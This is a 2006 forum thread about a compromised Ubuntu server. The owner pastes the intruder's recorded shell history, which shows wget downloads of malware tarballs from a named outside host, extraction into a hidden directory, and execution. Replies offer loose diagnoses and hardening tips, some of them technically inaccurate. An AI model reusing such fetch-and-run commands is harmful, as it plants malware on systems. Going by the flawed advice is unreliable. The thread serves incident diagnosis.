---
title: "my server just got hacked by the LINUX/Rst.B virus!"
date: 2006-07-28
forum: Server Platforms
---

### Post by hypermegachi on 2006-07-28
:confused: :confused: :confused: :confused: :confused: :confused: :confused: 

HOW??????????

ok, the linux box is running dapper 6.06.  iptables is off completely, so there's no firewall.  it is however, behind a windows 2003 firewall, opening up ports 80, 21, and 22.

vsftpd is running, apache2, and sshd.

i checked my /home directory today, and realized there was a test directory.  i went inside and it was empty.  i used a -a and it should me some bash stuff the hacker forgot to delete.

here's .bash_history
```

uname -a
uptime
w
passwd
ls
cat /proc/cpuinfo
ls
mkdir " "
cd " "
ps -def
ls
wget
wget www.svteam.marte.ro/buti.tgz
tar zxf buti.tgz
cd a
./linux
cd ..
ps -def
kill -9 8783
ls
cd a
ls
pico mech.set
ls
rm -rf Saracutu.seen
cd ..
ls
rm -rf buti.tgz
tar xcvf a buti.tgz
tar cxzf a buti.tgz
tar cxvf a buti.tgz
tar cxvf buti.tgz a
cd a
./linux
cd ..
ls
tar czvf a buti.tgz
tar cxvf a buti.tgz
tar czvf a buti.tgz
tar czvf buti.tgz a
ls
ftp svteam.marte.ro
ftp 193.239.166.45
cd /home
ls
cat /etc/hosts
uname
ls
cd " "
ls
rm -rf a buti.tgz
ps -x
kill -9 9086
ls
wget www.svteam.marte.ro/but.tgz
tar zxf but.tgz
cd a
./linux
w
ps -x
w
ls
ps -def
kill -9 31434
ls
cd " "
cd a
./linux
uptime
w

```

i went to download that thing in XP, and my virus scanner picked it up at the LINUX/Rst.B virus.

apparently this tries to infect ELF files the current directory and in /bin.

i'm doing a full clamav search right now.

does anyone know what happened?

---

### Post by gmatt on 2006-07-28
Without a look at the source of the ./linux program he ran I cannot tell you what it does. I downloaded the package and took a look at the files in there and it certainly looks like a virus. From the bash_history that you printed out I believe he ran the program a bunch of times killed it then reran it again after he was satisfied with the way he set it up on your machine. Personally I have no idea what to do at this point but I hope someone with a lot of security knowledge replies to you soon. If worst comes to worst you must prepare yourself for a format as soon as possible and remember to keep your firewalls on when you're running a server.

---

### Post by hypermegachi on 2006-07-28
hmmmm interesting....
he untarred the virus into a directory " ", which isn't displayed anywhere.

it was in the /home/test/ directory.
it was also extracted into my /var/lib/postgres directory.

is my postgres unsecured or something?

---

### Post by az on 2006-07-28
> **hypermegachi said:**
> 

does anyone know what happened?

You're running an ssh server and probably have a weak password.

---

### Post by gorilla_king on 2006-07-28
that really sux man, i had  an atack several weeks ago or i assumed it was, i had weird logs of someone trying password (actually i think  it was a script), but ofcourse i would immediately change your password and nothing shorter than 8 characters and and make sure it has letters and numbers.
plus since the file was hosted on a free server and your can't really trace the ownser, i would suggest you notify the hosting company. (xhost.ro) that they have a bad user and see if they will give you the email he signed up with. just a suggestion though

---

### Post by hypermegachi on 2006-07-29
> **azz said:**
> You're running an ssh server and probably have a weak password.
is there a way for me to figure out which account was used?  the test folder had a uid and gid of 1000, which doesn't exist on my system.

my root password is very secure.  it's case sensitive with numbers and symbols.  it was actually a randomly generated password that i memorized.

maybe postgres was the problem...because i think i had a weak password there.  but that doesn't explain how they got access to /home...

---

### Post by d3ck4 on 2006-07-29
maybe its related to the off-by-one buffer overflow in apache (0day?)

---

### Post by Ride Jib on 2006-07-29
What does your postgres log show? 
What does your auth/messages log show?
What does your apache log show?

Did you have md5sums of all your system binaries? If so check those against the current system binaries. If there is any differentiation, get the proper binaries back on there.

---

### Post by chaag on 2006-07-30
Buy a cheap Linksys or netgear router, do not expose port 22 to the Internet, instead, send some random port, say, 9136 to 22 on your Ubuntu machine and obscure your sshd process. To login to your server, do "ssh -P 9136 x.x.x.x". Also, check out jack the ripper and do a quick test on your passwords. You'll be amazed how easy it is to crack simple passwords.

---

